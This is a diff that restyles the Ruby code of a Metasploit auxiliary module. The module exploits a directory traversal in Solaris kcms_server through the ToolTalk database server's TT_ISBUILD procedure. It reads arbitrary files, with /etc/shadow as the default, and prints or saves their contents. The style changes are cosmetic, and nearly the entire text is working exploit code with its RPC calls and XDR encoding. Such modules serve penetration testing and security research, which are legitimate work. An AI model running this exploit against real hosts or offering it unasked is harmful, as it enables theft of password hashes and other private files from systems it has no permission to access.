@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,13 +7,12 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::SunRPC
 
   def initialize
     super(
       'Name'           => 'Solaris KCMS + TTDB Arbitrary File Read',
-      'Description'    => %q{
+      'Description'    => %q(
           This module targets a directory traversal vulnerability in the
         kcms_server component from the Kodak Color Management System. By
         utilizing the ToolTalk Database Server\'s TT_ISBUILD procedure, an
@@ -22,11 +22,11 @@ class MetasploitModule < Msf::Auxiliary
         Vulnerable systems include Solaris 2.5 - 9 SPARC and x86. Both
         kcms_server and rpc.ttdbserverd must be running on the target
         host.
-      },
+      ),
       'Author'         =>
         [
           'vlad902 <vlad902[at]gmail.com>', # MSF v2 module
-          'jduck'  # Ported to MSF v3
+          'jduck' # Ported to MSF v3
         ],
       'License'        => MSF_LICENSE,
       'References'     =>
@@ -43,17 +43,15 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'etc/shadow']),
         OptString.new('OUTPUTPATH', [ false, "Local path to save the file contents to", nil ])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
-
     # There is a fixed size buffer in use, so make sure we don't exceed it..
     # (NOTE: 24 bytes are reserved for traversal string)
     path = datastore['PATH']
-    if (path.length > 1000)
-      raise RuntimeError, "File name is too long."
-    end
+    raise "File name is too long." if path.length > 1000
 
     print_status("Making request to the ToolTalk Database Server...")
 
@@ -71,18 +69,17 @@ class MetasploitModule < Msf::Auxiliary
     buf = XDR.encode(
       [trav, 1024],
       0, # O_RDONLY
-      0755) # mode
+      0o755
+    ) # mode
 
     # Make the request
     ret = sunrpc_call(1003, buf)
     ack, fsize, fd = XDR.decode!(ret, Integer, Integer, Integer)
 
-    if (ack != 0)
+    if ack != 0
       print_error("KCMS open() failed (ack: 0x%x != 0)" % ack)
 
-      if (fsize == 0)
-        print_status("File does not exist (or host is patched)")
-      end
+      print_status("File does not exist (or host is patched)") if fsize == 0
       return
     end
 
@@ -93,23 +90,24 @@ class MetasploitModule < Msf::Auxiliary
     buf = XDR.encode(
       fd,
       0,
-      fsize)
+      fsize
+    )
 
     ret = sunrpc_call(1005, buf)
     x, data = XDR.decode!(ret, Integer, [Integer])
 
     # If we got something back...
-    if (data)
+    if data
       data = data.pack('C*')
 
       # Store or display the results
-      if (datastore['OUTPUTPATH'])
+      if datastore['OUTPUTPATH']
         fname = datastore['PATH'].gsub(/[\/\\]/, '_')
         outpath = File.join(datastore['OUTPUTPATH'], fname)
         print_status("Saving contents to #{outpath} ...")
-        File.open(outpath, "wb") { |fd|
+        File.open(outpath, "wb") do |fd|
           fd.write(data)
-        }
+        end
       else
         print_status("File contents:")
         print_status(data.inspect)
@@ -129,10 +127,9 @@ class MetasploitModule < Msf::Auxiliary
   rescue Timeout::Error, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Rex::Proto::SunRPC::RPCError => e
     print_error(e.to_s)
   rescue ::Rex::Proto::SunRPC::RPCTimeout
-    print_warning 'Warning: ' + $!
+    print_warning 'Warning: ' + $ERROR_INFO
     print_warning 'Exploit may or may not have succeeded.'
   end
-
 
   #
   # Send a TT_ISBUILD request to rpc.ttdbserverd
@@ -152,11 +149,11 @@ class MetasploitModule < Msf::Auxiliary
       # 21 zeros, /KEYDESC, /KEY
       0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
       0x10002,
-      path.length)
+      path.length
+    )
     ret = sunrpc_call(3, msg)
     arr = XDR.decode!(ret, Integer, Integer)
     print_status("TTDB reply: 0x%x, %d" % arr)
     sunrpc_destroy
   end
-
 end
